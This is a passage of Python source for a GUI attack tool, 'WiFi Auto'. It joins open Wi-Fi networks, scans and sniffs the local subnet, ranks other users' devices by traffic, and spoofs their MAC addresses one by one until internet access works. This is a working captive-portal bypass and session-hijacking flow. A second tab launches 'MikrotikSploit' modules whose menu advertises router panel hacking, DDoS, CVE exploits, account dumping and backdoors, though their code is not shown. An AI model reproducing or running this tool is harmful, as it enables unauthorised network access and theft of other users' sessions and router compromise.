            scope = build_scan_scope(local_ip, gateway_ip)
            deadline = time.time() + seconds
            while time.time() < deadline and not stop_event.is_set():
                udp_probe_sweep(scope[:1024], stop_event, max_workers=128)
                time.sleep(1.0)
        except Exception:
            pass
        return ranks
    else:
        try:
            proc = subprocess.Popen(
                ["tcpdump", "-i", iface, "-nn", "-q", "-e", "-l"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                text=True, errors="replace")
        except OSError:
            return ranks
        regex = re.compile(
            r"([0-9a-f]{2}(?::[0-9a-f]{2}){5}) > "
            r"([0-9a-f]{2}(?::[0-9a-f]{2}){5}), .*?\b(?:length|len)\s+(\d+)")
        deadline = time.time() + seconds
        try:
            while time.time() < deadline and not stop_event.is_set():
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.05)
                    if proc.poll() is not None:
                        break
                    continue
                m = regex.search(line)
                if not m:
                    continue
                src, _dst, length = m.groups()
                ranks[src] = ranks.get(src, 0) + int(length)
        finally:
            proc.terminate()
            try:
                proc.wait(2)
            except subprocess.TimeoutExpired:
                proc.kill()
        return ranks


def change_mac_and_reconnect(iface, mac, ssid, log):
    mac = normalize_mac(mac)
    if not mac:
        log(f"[ERROR] invalid device MAC: {mac}")
        return False
    if not set_mac_and_verify(iface, mac, log):
        connect_wifi(ssid)
        return False
    disconnect_wifi(iface)
    time.sleep(2)
    ok, err = connect_wifi(ssid)
    if not ok:
        log(f"[WARN] reconnect failed: {err}")
    return True


def test_internet():
    for target in ("8.8.8.8", "google.com"):
        if ping_host(target):
            return True
    return False


def wait_for(stop_event, seconds):
    end = time.time() + seconds
    while time.time() < end and not stop_event.is_set():
        time.sleep(0.2)


# ---------------------------------------------------------------------------
# GUI
# ---------------------------------------------------------------------------

class WiFiAutoApp:
    def __init__(self, root):
        self.root = root
        self.root.title(f"{APP_TITLE} v{APP_VERSION} — By {DEVELOPER}")
        self.root.geometry("780x580")
        self.root.minsize(660, 460)
        self.root.configure(bg=COL_BG)

        try:
            import base64
            self.ico_img = tk.PhotoImage(data=base64.b64decode(ICON_B64))
            self.root.iconphoto(True, self.ico_img)
        except Exception:
            pass

        self.report = Report(REPORT_PATH)
        self.events = queue.Queue()
        self.stop_event = threading.Event()
        self.running = False
        self._stop_handled = False
        self.iface = get_wifi_iface()
        self.original_mac = get_iface_mac(self.iface) if self.iface else None
        self.log_lines = []

        self._build_ui()
        self.root.after(100, self._poll_events)
        self.root.after(200, self.do_scan_wifi)
        self.root.after(2500, self._check_for_updates)

    def _check_for_updates(self):
        """Ask the official site if a newer version exists (non-blocking)."""
        start_update_check(
            self.root, SCRIPT_DIR, APP_VERSION, APP_TITLE,
            version_field="current_version",
            log=lambda m: self.events.put(("log", m)),
            on_version=self._apply_remote_version)

    def _apply_remote_version(self, ver):
        """Version comes from the site — sync every place that shows it."""
        global APP_VERSION
        APP_VERSION = str(ver)
        try:
            self.root.title(f"{APP_TITLE} v{APP_VERSION} — By {DEVELOPER}")
            for lbl in self._ver_labels:
                lbl.config(text=f"v{APP_VERSION}  •  Developed by {DEVELOPER}")
            if getattr(self, "footer_ver_lbl", None) is not None:
                self.footer_ver_lbl.config(
                    text=f"{APP_TITLE} v{APP_VERSION} \u2022 "
                         "Developed by " + DEVELOPER)
        except Exception:
            pass

    def _build_ui(self):
        # ---- Notebook: Tab 1 = WiFi Auto, Tab 2 = MikrotikSploit ----
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 6))
        self.main_tab = ttk.Frame(self.notebook)
        self.mikrotik_tab = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.main_tab, text="WiFi Auto")
        self.notebook.add(self.mikrotik_tab, text="MikrotikSploit")
        self._build_mikrotik_tab(self.mikrotik_tab)

        # ---- Header with logo and branding ----
        header = tk.Frame(self.main_tab, bg=COL_PANEL, bd=0)
        header.pack(fill=tk.X, padx=10, pady=10)
        
        # Logo canvas or label
        try:
            logo_lbl = tk.Label(header, image=self.ico_img, bg=COL_PANEL)
            logo_lbl.pack(side=tk.LEFT, padx=(10, 14), pady=8)
        except Exception:
            pass

        brand = tk.Frame(header, bg=COL_PANEL)
        brand.pack(side=tk.LEFT, fill=tk.Y, pady=6)
        
        title_lbl = tk.Label(brand, text=APP_TITLE, bg=COL_PANEL,
                             fg=COL_TEXT, font=("Segoe UI", 18, "bold"))
        title_lbl.pack(anchor=tk.W)
        
        sub_lbl = tk.Label(brand, text=f"v{APP_VERSION}  •  Developed by {DEVELOPER}",
                           bg=COL_PANEL, fg=COL_ACCENT, font=("Segoe UI", 9, "bold"))
        sub_lbl.pack(anchor=tk.W, pady=(2, 0))
        self._ver_labels = [sub_lbl]

        dev_lbl = tk.Label(brand, text=get_device_info(),
                           bg=COL_PANEL, fg=COL_MUTED, font=("Segoe UI", 8))
        dev_lbl.pack(anchor=tk.W, pady=(3, 0))

        tk.Frame(self.main_tab, bg=COL_BORDER, height=1).pack(fill=tk.X, padx=10)

        # ---- Adapter row ----
        top = ttk.Frame(self.main_tab, padding=10)
        top.pack(fill=tk.X)

        ttk.Label(top, text="Adapter:").pack(side=tk.LEFT)
        self.adapters = get_all_adapters()
        self.iface_var = tk.StringVar(value=self.iface if self.iface in self.adapters else (self.adapters[0] if self.adapters else ""))
        self.adapter_combo = ttk.Combobox(top, textvariable=self.iface_var, values=self.adapters, width=26, state="readonly")
        self.adapter_combo.pack(side=tk.LEFT, padx=4)
        self.adapter_combo.bind("<<ComboboxSelected>>", self._on_adapter_selected)

        self.scan_btn = ttk.Button(top, text="Scan WiFi", style="Accent.TButton",
                                   command=self.do_scan_wifi)
        self.scan_btn.pack(side=tk.LEFT, padx=4)

        self.mac_var = tk.StringVar(
            value=f"Original MAC: {self.original_mac}")
        ttk.Label(top, textvariable=self.mac_var,
                  style="Muted.TLabel").pack(side=tk.RIGHT)

        # ---- WiFi list ----
        wifi_frame = ttk.LabelFrame(self.main_tab, text="Open WiFi networks (no password)",
                                    padding=8)
        wifi_frame.pack(fill=tk.X, padx=10, pady=(0, 6))

        self.wifi_list = tk.Listbox(wifi_frame, height=6, bg=COL_PANEL2,
                                    fg=COL_TEXT, selectbackground=COL_ACCENT,
                                    selectforeground="#0B1220",
                                    highlightthickness=0, bd=0,
                                    font=("Segoe UI", 10))
        wifi_scroll = ttk.Scrollbar(wifi_frame, orient=tk.VERTICAL,
                                    command=self.wifi_list.yview)
        self.wifi_list.configure(yscrollcommand=wifi_scroll.set)
        self.wifi_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        wifi_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.wifi_list.bind("<<ListboxSelect>>", self._on_wifi_selected)

        # ---- Buttons ----
        btns = ttk.Frame(self.main_tab, padding=10)
        btns.pack(fill=tk.X)

        self.start_btn = ttk.Button(btns, text="Start", style="Green.TButton",
                                    state=tk.DISABLED, command=self.start_flow)
        self.start_btn.pack(side=tk.LEFT)
        self.stop_btn = ttk.Button(btns, text="Stop", style="Red.TButton",
                                   state=tk.DISABLED, command=self.stop_flow)
        self.stop_btn.pack(side=tk.LEFT, padx=6)
        self.copy_btn = ttk.Button(btns, text="Copy Log",
                                   command=self.copy_log)
        self.copy_btn.pack(side=tk.LEFT, padx=6)
        self.save_btn = ttk.Button(btns, text="Save Report",
                                   command=self.save_report)
        self.save_btn.pack(side=tk.LEFT, padx=6)
        self.restore_btn = ttk.Button(btns, text="Restore MAC",
                                      style="Amber.TButton",
                                      command=self.restore_mac)
        self.restore_btn.pack(side=tk.LEFT, padx=6)

        # ---- Status box ----
        status_row = tk.Frame(self.main_tab, bg=COL_PANEL)
        status_row.pack(fill=tk.X, padx=10)
        self.status_dot = tk.Label(status_row, text="\u25CF", fg=COL_MUTED,
                                   bg=COL_PANEL, font=("Segoe UI", 12))
        self.status_dot.pack(side=tk.LEFT, padx=(6, 4), pady=6)
        self.status_var = tk.StringVar(value="Ready.")
        self.status_lbl = tk.Label(status_row, textvariable=self.status_var,
                                   bg=COL_PANEL, fg=COL_TEXT,
                                   anchor=tk.W, font=("Segoe UI", 10))
        self.status_lbl.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=6)

        # ---- Log ----
        log_frame = ttk.LabelFrame(self.main_tab, text="Log (also saved to report.txt)",
                                   padding=8)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=6)
        self.log_text = tk.Text(log_frame, height=12, state=tk.NORMAL,
                                bg=COL_LOG_BG, fg=COL_TEXT, insertbackground=COL_TEXT,
                                font=("Consolas", 9), relief=tk.FLAT,
                                highlightthickness=1,
                                highlightbackground=COL_BORDER)
        make_selectable_copyable(self.log_text)
        log_scroll = ttk.Scrollbar(log_frame, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_scroll.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        log_scroll.pack(side=tk.RIGHT, fill=tk.Y)

        # ---- Footer ----
        tk.Frame(self.main_tab, bg=COL_ACCENT, height=1).pack(fill=tk.X)
        footer = tk.Frame(self.main_tab, bg=COL_BG)
        footer.pack(fill=tk.X)
        self.footer_ver_lbl = ttk.Label(footer, text=f"{APP_TITLE} v{APP_VERSION} \u2022 "
                  "Developed by " + DEVELOPER,
                  style="Version.TLabel")
        self.footer_ver_lbl.pack(side=tk.RIGHT, padx=14, pady=4)

        if not IS_ROOT:
            self.log("[WARNING] Not running as Administrator/root! MAC change and advanced ARP sweep need admin privileges.")

    # ---- MikrotikSploit tab ----
    def _build_mikrotik_tab(self, parent):
        info = tk.Frame(parent, bg=COL_PANEL)
        info.pack(fill=tk.X, pady=(0, 10))
        tk.Label(info, text="MikrotikSploit v0.1", bg=COL_PANEL,
                 fg=COL_ACCENT, font=("Segoe UI", 13, "bold")).pack(anchor=tk.W, padx=10, pady=(8, 2))
        tk.Label(info, text="Runs inside this window (no separate terminal).\n"
                 "1) Getting Password  2) Hack Mikrotik Panel  3) DDoS  4) About  5) Update  6) Exit\n"
                 "7) Exploit CVEs (14847 user.dat / API default creds / 24571 crash)\n"
                 "8) Scan Network (find all MikroTik devices with versions)\n"
                 "9) API Control (login + dump accounts + backdoor, needs open API)\n"
                 "10) Session Status (live: what is reachable, what is blocked, how to proceed)\n"
                 "Tip: press AUTO MODE to scan the whole network + run all 19 CVE checks + safe exploits automatically.\n"
                 "Type the number below and press Enter.",
                 bg=COL_PANEL, fg=COL_MUTED, font=("Segoe UI", 9), justify=tk.LEFT).pack(anchor=tk.W, padx=10, pady=(0, 8))

        btns = ttk.Frame(parent)
        btns.pack(fill=tk.X, pady=(0, 8))
        self.mikrotik_run_btn = ttk.Button(btns, text="Run", style="Green.TButton",
                                           command=self.run_mikrotik)
        self.mikrotik_run_btn.pack(side=tk.LEFT)
        self.mikrotik_stop_btn = ttk.Button(btns, text="Stop", style="Red.TButton",
                                            state=tk.DISABLED, command=self.stop_mikrotik)
        self.mikrotik_stop_btn.pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Clear Console", command=self.clear_mikrotik_console).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Copy Console", command=self.copy_mikrotik_console).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Refresh Log", style="Accent.TButton",
                   command=self.refresh_mikrotik_log).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Scan Network", style="Accent.TButton",
                   command=self.scan_mikrotik_network).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="AUTO MODE", style="Green.TButton",
                   command=self.auto_mikrotik).pack(side=tk.LEFT, padx=6)

        console_frame = ttk.LabelFrame(parent, text="Console (logs/logs.txt is saved too)", padding=8)
        console_frame.pack(fill=tk.BOTH, expand=True)
        self.mikrotik_console = tk.Text(console_frame, height=14, state=tk.NORMAL,
                                        bg=COL_LOG_BG, fg=COL_TEXT, insertbackground=COL_TEXT,
                                        font=("Consolas", 9), relief=tk.FLAT,
                                        highlightthickness=1, highlightbackground=COL_BORDER,
                                        wrap=tk.NONE)
        make_selectable_copyable(self.mikrotik_console)
        console_scroll = ttk.Scrollbar(console_frame, command=self.mikrotik_console.yview)
        self.mikrotik_console.configure(yscrollcommand=console_scroll.set)
        self.mikrotik_console.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        console_scroll.pack(side=tk.RIGHT, fill=tk.Y)

        input_row = ttk.Frame(parent)
        input_row.pack(fill=tk.X, pady=(8, 0))
        ttk.Label(input_row, text="Input:").pack(side=tk.LEFT)
        self.mikrotik_input = ttk.Entry(input_row)
        self.mikrotik_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6)
        self.mikrotik_input.bind("<Return>", self.send_mikrotik_input)
        self.mikrotik_console.bind("<Return>", self.send_mikrotik_input)
        self.mikrotik_console.bind("<KP_Enter>", self.send_mikrotik_input)
        self.mikrotik_send_btn = ttk.Button(input_row, text="Send", style="Accent.TButton",
                                            command=self.send_mikrotik_input)
        self.mikrotik_send_btn.pack(side=tk.LEFT)

        self.mikrotik_proc = None
        self._console_write(">>> Press 'Run' to start MikrotikSploit inside this window.\n")
        self.refresh_mikrotik_log()

    def _console_write(self, text):
        pos = 0
        fg = COL_TEXT
        for m in re.finditer(r"\x1b\[[0-9;?]*[A-Za-z]", text):
            self._insert_ansi(text[pos:m.start()], fg)
            code = m.group(0)
            if code.endswith("m"):
                params = code[2:-1].split(";")
                if "0" in params:
                    fg = COL_TEXT
                for p in params:
                    if p in ANSI_COLORS:
                        fg = ANSI_COLORS[p]
            pos = m.end()
        self._insert_ansi(text[pos:], fg)
        self.mikrotik_console.see(tk.END)

    def _insert_ansi(self, text, fg):
        if not text:
            return
        text = text.replace("\r", "")
        tag = "c" + fg.lstrip("#")
        self.mikrotik_console.tag_configure(tag, foreground=fg)
        self.mikrotik_console.insert(tk.END, text, tag)

    def clear_mikrotik_console(self):
        self.mikrotik_console.delete("1.0", tk.END)

    def copy_mikrotik_console(self):
        content = self.mikrotik_console.get("1.0", tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        self.log("[Mikrotik] Console copied to clipboard.")

    def run_mikrotik(self):
        self._launch_mikrotik([sys.executable, "-u", "MikrotikSploit.py"],
                              "MikrotikSploit")

    def scan_mikrotik_network(self):
        self._launch_mikrotik([sys.executable, "-u", "modules/net_scan.py"],
                              "Network Scan")

    def auto_mikrotik(self):
        self._launch_mikrotik([sys.executable, "-u", "modules/auto_mode.py"],
                              "AUTO MODE")

    def _launch_mikrotik(self, cmd, label):
        if not os.path.isdir(MIKROTIK_DIR):
            self.log(f"[ERROR] MikrotikSploit folder not found: {MIKROTIK_DIR}")
            self._console_write(f">>> ERROR: folder not found: {MIKROTIK_DIR}\n")
            return
        if self.mikrotik_proc and self.mikrotik_proc.poll() is None:
            self._console_write(">>> Already running. Press Stop first.\n")
            return
        try:
            env = dict(os.environ)
            env["PYTHONUNBUFFERED"] = "1"
            self.mikrotik_proc = subprocess.Popen(
                cmd, cwd=MIKROTIK_DIR, stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                env=env)
        except OSError as exc:
            self._console_write(f">>> ERROR launching: {exc}\n")
            return
        self.mikrotik_run_btn.configure(state=tk.DISABLED)
        self.mikrotik_stop_btn.configure(state=tk.NORMAL)
        self._console_write(f">>> {label} started (folder: {MIKROTIK_DIR})\n")
        threading.Thread(target=self._mikrotik_reader, daemon=True).start()
        self.log(f"[Mikrotik] {label} started inside the app console.")

    def _mikrotik_reader(self):
        proc = self.mikrotik_proc
        if proc is None:
            return
        try:
            while True:
                if proc.poll() is not None:
                    break
                data = os.read(proc.stdout.fileno(), 4096)
                if not data:
                    break
                self.root.after(0, lambda d=data: self._console_write(
                    d.decode("utf-8", "replace")))
        except OSError:
            pass
        self.root.after(0, self._mikrotik_on_exit)

    def _mikrotik_on_exit(self):
        self.mikrotik_run_btn.configure(state=tk.NORMAL)
        self.mikrotik_stop_btn.configure(state=tk.DISABLED)
        self._console_write(">>> MikrotikSploit closed.\n")

    def stop_mikrotik(self):
        proc = self.mikrotik_proc
        if proc and proc.poll() is None:
            try:
                proc.send_signal(signal.SIGINT)
            except OSError as exc:
                self._console_write(f">>> Could not send SIGINT: {exc}\n")
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self._console_write(">>> Still running, sending SIGTERM...\n")
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except (OSError, subprocess.TimeoutExpired):
                    self._console_write(">>> Still running, forcing kill...\n")
                    try:
                        proc.kill()
                        proc.wait(timeout=2)
                    except OSError as exc:
                        self._console_write(f">>> Could not kill: {exc}\n")
            if proc.poll() is not None:
                self._console_write(">>> Process stopped.\n")
                self.mikrotik_run_btn.configure(state=tk.NORMAL)
                self.mikrotik_stop_btn.configure(state=tk.DISABLED)

    def send_mikrotik_input(self, _event=None):
        proc = self.mikrotik_proc
        if not proc or proc.poll() is not None:
            self._console_write(">>> Not running. Press Run first.\n")
            return
        text = self.mikrotik_input.get()
        if not text.strip():
            return
        try:
            proc.stdin.write(text.encode("utf-8") + b"\n")
            proc.stdin.flush()
            self._console_write(text + "\n")
        except OSError as exc:
            self._console_write(f">>> Input error: {exc}\n")
        self.mikrotik_input.delete(0, tk.END)
        self.mikrotik_input.focus_set()

    def refresh_mikrotik_log(self):
        try:
            with open(os.path.join(MIKROTIK_DIR, "logs", "logs.txt"),
                      "r", errors="replace") as f:
                content = f.read()
        except OSError:
            content = ""
        if not content.strip():
            return
        self._console_write("\n--- log file ---\n" + content)

    def on_close(self):
        """Kill the embedded MikrotikSploit process before closing."""
        proc = self.mikrotik_proc
        if proc and proc.poll() is None:
            try:
                proc.terminate()
            except OSError:
                pass
        self.root.destroy()

    def _on_adapter_selected(self, _event=None):
        self.iface = self.iface_var.get()
        self.original_mac = get_iface_mac(self.iface) if self.iface else None
        self.mac_var.set(f"Original MAC: {self.original_mac}")
        self.log(f"Selected adapter: {self.iface} (MAC: {self.original_mac})")

    def _on_wifi_selected(self, _event=None):
        self.start_btn.config(
            state=tk.NORMAL if self.wifi_list.curselection() else tk.DISABLED)

    def set_status(self, text, color=None):
        """Update the status line + LED dot. color: None(muted)/
        'ok'/'busy'/'err'."""
        self.status_var.set(text)
        c = {"ok": COL_GREEN, "busy": COL_AMBER,
             "err": COL_RED}.get(color, COL_MUTED)
        self.status_dot.config(fg=c)
        self.status_lbl.config(fg=COL_TEXT)

    def do_scan_wifi(self):
        self.scan_btn.config(state=tk.DISABLED)
        self.set_status("Scanning open WiFi networks ...", "busy")
        threading.Thread(target=self._scan_worker, daemon=True).start()

    def _scan_worker(self):
        try:
            nets = scan_open_wifi()
        except Exception as e:
            self.events.put(("scan_done", ([], f"Scan failed: {e}")))
            return
        self.events.put(("scan_done", (nets, "")))

    def _on_scan_done(self, nets, error):
        self.scan_btn.config(state=tk.NORMAL)
        self.wifi_list.delete(0, tk.END)
        if error:
            self.set_status(error, "err")
            self.log(f"[ERROR] {error}")
            self.report.write(f"[ERROR] {error}")
            return
        for ssid in nets:
            self.wifi_list.insert(tk.END, ssid)
        self.set_status(
            f"Found {len(nets)} open network(s). Select one then press Start.",
            "ok" if nets else None)

    def start_flow(self):
        sel = self.wifi_list.curselection()
        if not sel:
            return
        ssid = self.wifi_list.get(sel[0])
        self.running = True
        self.stop_event.clear()
        self._stop_handled = False
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.scan_btn.config(state=tk.DISABLED)
        self.log(f"Selected network: {ssid}")
        threading.Thread(target=self._flow_worker, args=(ssid,),
                         daemon=True).start()

    def stop_flow(self):
        self.stop_event.set()
        self.set_status("Stopping ...", "err")
        self.log("Stop requested.")

    def copy_log(self):
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(self.log_lines))
        self.set_status("Log copied to clipboard.", "ok")

    def save_report(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")],
            initialfile="report.txt")
        if not path:
            return
        try:
            with open(self.report.path, "r", encoding="utf-8") as src, \
                    open(path, "w", encoding="utf-8") as dst:
                dst.write(src.read())
            self.set_status(f"Report saved to: {path}", "ok")
        except OSError as e:
            messagebox.showerror("Save Report", str(e))

    def restore_mac(self):
        if self.running:
            messagebox.showwarning("Restore", "Stop the process first.")
            return
        if not (self.iface and self.original_mac):
            messagebox.showerror("Restore",
                                 "No original MAC recorded for this adapter.")
            return
        self.log(f"Restoring original MAC {self.original_mac} ...")
        self._do_change_mac(self.original_mac, "Original MAC restored")

    def _do_change_mac(self, mac, ok_msg):
        def log(msg):
            self.events.put(("log", msg))

        if not IS_ROOT:
            msg = "MAC change requires Administrator/root privileges."
            self.log(f"[ERROR] {msg}")
            self.report.write(f"[ERROR] {msg}")
            return
        ok = set_mac(self.iface, normalize_mac(mac), log)
        self.events.put(("status",
                         (ok_msg if ok else "MAC change failed.", "ok" if ok
                          else "err")))
        self.events.put(("mac", get_iface_mac(self.iface)))

    def _flow_worker(self, ssid):
        def status(text, color="busy"):
            self.events.put(("status", (text, color)))
        try:
            if not self.iface:
                raise RuntimeError("No wifi interface found.")
            self.report.write(f"Selected network: {ssid}")

            ok, err = connect_wifi(ssid)
            if not ok:
                raise RuntimeError(f"Could not connect to '{ssid}': {err}")
            self.events.put(("log", f"Connected to {ssid}"))
            status(f"Connected to {ssid}, working ...")
            wait_for(self.stop_event, 3)

            local_ip = get_local_ip()
            network = get_network(local_ip)
            gateway_ip = get_default_gateway()
            self.events.put(("log", f"Local IP: {local_ip} | Network: "
                                    f"{network} | Gateway: {gateway_ip}"))

            round_no = 0
            empty_rounds = 0
            while not self.stop_event.is_set():
                round_no += 1
                self.events.put(("log", f"--- Round {round_no}: scanning "
                                        f"devices ---"))
                my_mac = get_iface_mac(self.iface) or ""
                scope = build_scan_scope(local_ip, gateway_ip)
                self.events.put(("log", f"Scanning {len(scope)} address(es) "
                                        f"for up to 15s ..."))
                devices = scan_devices(scope, self.stop_event,
                                       my_mac, gateway_ip, duration=15,
                                       progress=self._log_safe)
                self.events.put(("log", f"Found {len(devices)} device(s)."))
                if not devices:
                    empty_rounds += 1
                    if empty_rounds >= EMPTY_ROUNDS_LIMIT:
                        msg = ("Giving up: no other devices found after "
                               f"{EMPTY_ROUNDS_LIMIT} rounds. Make sure "
                               "other devices are connected to this network.")
                        self.events.put(("log", msg))
                        return
                    self.events.put(("log", "No devices found, retrying in "
                                            "3s ..."))
                    wait_for(self.stop_event, 3)
                    continue
                empty_rounds = 0

                self.events.put(("log", f"Checking traffic/activity for "
                                        f"{SNIFF_SECONDS}s ..."))
                ranks = sniff_traffic_rank(self.iface, SNIFF_SECONDS,
                                           self.stop_event)
                if ranks:
                    top = max(ranks, key=ranks.get)
                    self.events.put(("log", f"Busiest device seen: {top}"))
                else:
                    self.events.put(("log", "Using device list order."))

                mac_to_ip = {}
                for ip, mac in devices.items():
                    mac_to_ip.setdefault(mac, ip)
                macs = sorted(mac_to_ip,
                              key=lambda m: ranks.get(m, 0), reverse=True)

                self.events.put(("log", f"Scan results: {len(macs)} MAC(s) "
                                        f"= {', '.join(macs)}"))

                for mac in macs:
                    if self.stop_event.is_set():
                        return
                    ip = mac_to_ip[mac]
                    self.events.put(("log", f"Attempt: spoofing MAC {mac} "
                                            f"(device {ip})"))
                    status(f"Spoofing MAC {mac} ...")
                    if not change_mac_and_reconnect(self.iface, mac, ssid,
                                                    self._log_safe):
                        self.report.write(f"[ERROR] MAC change failed for "
                                          f"{mac} - moving to next scanned "
                                          f"MAC, NOT reverting.")
                        status(f"MAC {mac} failed - trying next scanned "
                               "MAC", "err")
                        continue
                    self.events.put(("mac", get_iface_mac(self.iface)))
                    self.events.put(("log", f"MAC changed to {mac}. Waiting "
                                            f"{PING_WAIT_SECONDS}s then "
                                            f"testing internet ..."))
                    wait_for(self.stop_event, PING_WAIT_SECONDS)
                    if self.stop_event.is_set():
                        return
                    if test_internet():
                        self.report.write(
                            f"SUCCESS with MAC {mac} - internet works!")
                        self.events.put(("done", mac))
                        return
                    self.events.put(("log", "Internet test FAILED - trying "
                                            "next scanned MAC, keeping the "
                                            "current MAC (no revert) ..."))

                self.events.put(("log", "All scanned MACs tried in this "
                                        "round, rescanning ..."))
        except Exception as e:
            import traceback
            tb = traceback.format_exc()
            self.events.put(("log", f"[ERROR] {e}\n{tb}"))
            status(f"Error: {e}", "err")
        finally:
            self.events.put(("flow_end", None))

    def _log_safe(self, text):
        self.events.put(("log", text))

    def _on_done(self, mac):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.scan_btn.config(state=tk.NORMAL)
        self.set_status(f"DONE! Internet works with MAC {mac}", "ok")
        self.log(f"DONE! Internet works with MAC {mac}")
        messagebox.showinfo(
            f"{APP_TITLE} - Done",
            f"DONE! Internet is working with MAC:\n{mac}\n\n"
            "Full log is in report.txt (next to this script).\n\n"
            f"Developed by {DEVELOPER}")

    def _on_stopped(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.scan_btn.config(state=tk.NORMAL)
        self.set_status("Stopped.", "err")
        self.log("Stopped.")

    def log(self, text):
        self.log_lines.append(text)
        self.log_text.insert(tk.END, text + "\n")
        self.log_text.see(tk.END)

    def _poll_events(self):
        try:
            while True:
                kind, value = self.events.get_nowait()
                if kind == "scan_done":
                    nets, error = value
                    self._on_scan_done(nets, error)
                elif kind == "log":
                    self.report.write(value)
                    self.log(value)
                elif kind == "status":
                    if isinstance(value, tuple):
                        self.set_status(value[0], value[1])
                    else:
                        self.set_status(value)
                elif kind == "mac":
                    self.mac_var.set(f"Current MAC: {value}")
                elif kind == "done":
                    self._on_done(value)
                elif kind == "flow_end":
                    if self.running:
                        self._on_stopped()
        except queue.Empty:
            pass
        if self.running and self.stop_event.is_set() and \
                not self._stop_handled:
            self._stop_handled = True
            self._on_stopped()
        self.root.after(100, self._poll_events)


def apply_dark_style(root):
    """Apply the WiFi Auto dark theme to the whole app."""
    root.configure(bg=COL_BG)
    try:
        style = ttk.Style(root)
        if "clam" in style.theme_names():
            style.theme_use("clam")
        style.configure(".", background=COL_PANEL, foreground=COL_TEXT,
                        bordercolor=COL_BORDER, lightcolor=COL_PANEL,
                        darkcolor=COL_PANEL, troughcolor=COL_PANEL2,
                        fieldbackground=COL_PANEL2, selectbackground=COL_ACCENT,
                        selectforeground="#0B1220",
                        focuscolor=COL_ACCENT, font=("Segoe UI", 10))
        style.configure("TFrame", background=COL_PANEL)
        style.configure("TLabel", background=COL_PANEL, foreground=COL_TEXT)
        style.configure("Muted.TLabel", foreground=COL_MUTED)
        style.configure("Title.TLabel", background=COL_BG,
                        foreground=COL_TEXT, font=("Segoe UI", 20, "bold"))
        style.configure("Subtitle.TLabel", background=COL_BG,
                        foreground=COL_ACCENT, font=("Segoe UI", 9))
        style.configure("Version.TLabel", background=COL_BG,
                        foreground=COL_MUTED, font=("Segoe UI", 9))
        style.configure("TLabelFrame", background=COL_PANEL,
                        bordercolor=COL_BORDER,
                        foreground=COL_ACCENT, font=("Segoe UI", 10, "bold"))
        style.configure("TLabelframe.Label", background=COL_PANEL,
                        foreground=COL_ACCENT, font=("Segoe UI", 10, "bold"))
        style.configure("TCombobox", fieldbackground=COL_PANEL2,
                        background=COL_PANEL2, foreground=COL_TEXT,
                        arrowcolor=COL_ACCENT)
        style.map("TCombobox",
                  fieldbackground=[("readonly", COL_PANEL2)],
                  foreground=[("readonly", COL_TEXT)])
        style.configure("TButton", background=COL_PANEL2,
                        foreground=COL_TEXT, padding=(12, 6),
                        font=("Segoe UI", 10, "bold"))
        style.map("TButton",
                  background=[("active", COL_BORDER),
                              ("disabled", "#20242F")],
                  foreground=[("disabled", "#5B6472")])
        for name, color in (("Accent.TButton", COL_ACCENT),
                            ("Green.TButton", COL_GREEN),
                            ("Red.TButton", COL_RED),
                            ("Amber.TButton", COL_AMBER)):
            style.configure(name, background=color, foreground="#0B1220",
                            padding=(12, 6), font=("Segoe UI", 10, "bold"))
            style.map(name,
                      background=[("active", "#3B82F6" if name ==
                                   "Accent.TButton" else color),
                                  ("disabled", "#20242F")],
                      foreground=[("disabled", "#5B6472")])
        style.configure("TScrollbar", background=COL_PANEL2,
                        troughcolor=COL_BG, bordercolor=COL_BG,
                        arrowcolor=COL_MUTED)
        style.configure("TSpinbox", fieldbackground=COL_PANEL2,
                        background=COL_PANEL2, foreground=COL_TEXT,
                        arrowcolor=COL_ACCENT)
    except tk.TclError:
        pass


def main():
    if IS_WINDOWS and not IS_ROOT:
        relaunch_as_admin()
        return
    root = tk.Tk()
    apply_dark_style(root)
    app = WiFiAutoApp(root)
    root.protocol("WM_DELETE_WINDOW", lambda: app.on_close())
    root.mainloop()


if __name__ == "__main__":
    main()
